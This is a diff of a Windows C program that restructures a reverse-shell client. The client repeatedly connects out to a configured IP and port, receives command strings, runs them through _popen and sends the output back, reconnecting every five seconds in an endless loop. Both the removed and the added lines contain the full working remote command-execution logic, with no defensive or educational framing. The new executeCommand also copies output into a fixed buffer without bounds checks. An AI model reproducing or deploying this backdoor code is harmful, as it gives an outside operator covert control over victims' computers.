@@ -10,124 +10,93 @@ int main(int argc, char * argv[])
 	//Main program
 	while(1){
 		setupvar(&file);
+		main_loop(&file);
+	}
 
-		//startup sa
-		WSADATA wsa;
-		if(WSAStartup(MAKEWORD(2, 2), &wsa) != NO_ERROR){
-			goto close;
-		}
-
-		/* initialize socket */
-		SOCKET s = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
-		if(s == INVALID_SOCKET){
-			goto close;
-		}
-
-		/* setup variables */
-		FILE *pPipe;
-		int cn;													//command pipe
-		int bytesSent;                  //number of bytes ent
-		int bytesRecv;              // number of bytes received
-		char sessionID[5] = "";					// Session id given by serv
-		char buf[BUFSIZE] = "";					//buf
-
-		bytesSent = 0;
-		bytesRecv = SOCKET_ERROR;
-
-						//server to connect information
-
-		/* create pointers so that the synthacts gets faster*/
-		int * pbs = &bytesSent;
-		int * pbr = &bytesRecv;
-
-		/* connect */
-
-		do{
-			cn = connect(s, (SOCKADDR*) &file.client, sizeof(file.client));
-		} while( cn == SOCKET_ERROR);
-
-		/* receive session ID */
-		if(cn != SOCKET_ERROR){
-
-			/*Recv sessionID*/
-			*pbr = SOCKET_ERROR;
-			sessionID[0] = wrecvsid(s, BUFSIZE, pbr);
-
-			/*Send ui with session id*/
-			if(sendui(s, sessionID[0], pbs) == 1){
-				goto close;
-			}
-
-		}
-		/*
-		 *End of session id blocks
-		 **/
-
-		while(cn != SOCKET_ERROR){
-
-			/*
-			 *Send Prompt if no session ID
-			 **/
-			 if(sendprompt(s, sessionID[0]) < 0){
-				 goto close;
-			 }
-
-			*pbr = SOCKET_ERROR;
-
-			while(*pbr == SOCKET_ERROR){
-				*pbr = recv(s, buf, BUFSIZE, 0);
-				if(*pbr == 0 || *pbr == WSAECONNRESET){
-					break;
-				}
-
-				if(bytesRecv < 0){
-					return -1;
-				} else {
-					/*process received data*/
-					int q = processdata(s, buf[0], buf[1]);
-					if(q < 0){
-
-						goto close;
-
-					} else {
-
-						if( (pPipe = _popen( buf, "r" )) == NULL ){
-
-							memset(buf, 0, BUFSIZE);
-							strcpy(buf, "error in command");
-
-						} else {
-
-							memset(buf, 0, BUFSIZE);
-							int i = 0;
-							char ch;
-							while((ch = fgetc(pPipe)) != EOF){
-								buf[i] = ch;
-								i++;
-							}
-
-						}
-
-						/*
-						 * Send back output
-						 **/
-						 if(sendbuf(s, buf, BUFSIZE) > 0){
-							 goto close;
-						 }
-
-					}
-				}
-			}
-
-
-
-		}	// end of the while connected loop.
-		close:
-		_pclose(pPipe);
-		WSACleanup();
-		Sleep(5000);	//5 sec cooldown so that when it quits the server it doesnt flip out.
-	}//end of main while loop.
 	return 0;
+}
+
+int main_loop(fileWrapper * file)
+{
+	/* setup variables */
+	int cn;													//command pipe
+	int bytesSent;                  //number of bytes ent
+	int bytesRecv;              // number of bytes received
+	char sessionID[5] = "";					// Session id given by serv
+	char buf[BUFSIZE] = "";					//buf
+
+	bytesSent = 0;
+	bytesRecv = SOCKET_ERROR;
+
+	/* create pointers so that the synthacts gets faster*/
+	int * pbs = &bytesSent;
+	int * pbr = &bytesRecv;
+
+	/* connect */
+
+	connected(file, &cn);
+
+	/* receive session ID */
+	if(cn != SOCKET_ERROR){
+
+		/*Recv sessionID*/
+		*pbr = SOCKET_ERROR;
+		sessionID[0] = wrecvsid(file->s, BUFSIZE, pbr);
+
+		/*Send ui with session id*/
+		if(sendui(file->s, sessionID[0], pbs) == 1){
+			goto close;
+		}
+
+	}
+	/*
+	 *End of session id blocks
+	 **/
+
+	while(cn != SOCKET_ERROR){
+
+		/*
+		 *Send Prompt if no session ID
+		 **/
+		 if(sendprompt(file->s, sessionID[0]) < 0){
+			 goto close;
+		 }
+		 memset(file->buf, 0, BUFSIZE);
+
+		*pbr = SOCKET_ERROR;
+
+		while(*pbr == SOCKET_ERROR){
+			*pbr = recv(file->s, file->buf, BUFSIZE, 0);
+			if(*pbr == 0 || *pbr == WSAECONNRESET){
+				break;
+			}
+
+			if(bytesRecv < 0){
+				return -1;
+			} else {
+				/*process received data*/
+				int q = processdata(file->s, file->buf[0], file->buf[1]);
+				if(q < 0){
+
+					goto close;
+
+				} else {
+
+					if (executeCommand(file) > 0){
+						goto close;
+					}
+
+				}
+			}
+		}
+
+
+
+	}	// end of the while connected loop.
+	close:
+	_pclose(file->pPipe);
+	WSACleanup();
+	Sleep(5000);	//5 sec cooldown so that when it quits the server it doesnt flip out.
 }
 
 int setupvar(fileWrapper * file)
@@ -183,10 +152,28 @@ int setupvar(fileWrapper * file)
 		fclose(fip);
 	}
 
+	//startup sa
+	if(WSAStartup(MAKEWORD(2, 2), &file->wsa) != NO_ERROR){
+		exit(1);
+	}
+
+	/* initialize socket */
+	file->s = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
+	if(file->s == INVALID_SOCKET){
+		exit(1);
+	}
+
 	file->client.sin_family = AF_INET;
 	file->client.sin_port = htons(file->portno);
 	file->client.sin_addr.s_addr = inet_addr(file->ip);	//this should not be hard coded.
 
+}
+
+void connected(fileWrapper * file, int * cn)
+{
+	do{
+		*cn = connect(file->s, (SOCKADDR*) &file->client, sizeof(file->client));
+	} while( *cn == SOCKET_ERROR);
 }
 
 int processdata(SOCKET s, char cmd, char cmd2)
@@ -446,6 +433,34 @@ int sendprompt(SOCKET s, char uin)
 	}
 
 	return 0;
+}
+
+int executeCommand(fileWrapper * file)
+{
+	if( (file->pPipe = _popen( file->buf, "r" )) == NULL ){
+
+		memset(file->buf, 0, BUFSIZE);
+		strcpy(file->buf, "error in command");
+
+	} else {
+
+		memset(file->buf, 0, BUFSIZE);
+		int i = 0;
+		char ch;
+		while((ch = fgetc(file->pPipe)) != EOF){
+			file->buf[i] = ch;
+			i++;
+		}
+
+	}
+
+	/*
+	 * Send back output
+	 **/
+	 if(sendbuf(file->s, file->buf, BUFSIZE) > 0){
+		 return 1;
+	 }
+
 }
 
 /*
